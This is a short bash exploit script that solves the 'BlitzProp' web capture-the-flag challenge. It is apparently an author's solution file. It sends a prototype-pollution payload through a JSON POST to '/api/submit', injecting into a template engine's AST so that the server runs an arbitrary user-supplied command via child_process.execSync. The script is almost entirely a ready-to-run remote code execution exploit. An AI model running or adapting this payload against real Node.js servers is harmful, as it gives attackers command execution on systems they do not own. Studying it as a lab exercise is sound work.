#!/bin/bash



# @elbee_ez

####################################################################################
####################################################################################
# BlitzProp | Difficulty 1-star | Web  #############################################
####################################################################################
# A tribute page for the legendary alien band called BlitzProp! ####################
# This challenge will raise 33 euros for a good cause. #############################
####################################################################################
# This article really helped doing this challenge, https://blog.p6.is/AST-Injection/
####################################################################################

# VULN was command execution via prototype pollution to trick a template renderer.


if [ "$#" -ne 3 ]; then
	echo "Usuage: ./blitzprop.sh <rhost> <rport> <command>"
else
	echo "Executing $3, this will take a minute."
	echo ""
	curl -H "Content-Type: application/json" -X POST -d "{\"song.name\":\"Not Polluting with the boys\",\"__proto__.block\": {\"type\": \"Text\",\"line\": \"process.mainModule.require('child_process').execSync('$3')\"}}" http://$1:$2/api/submit | grep pre
	echo ""
fi


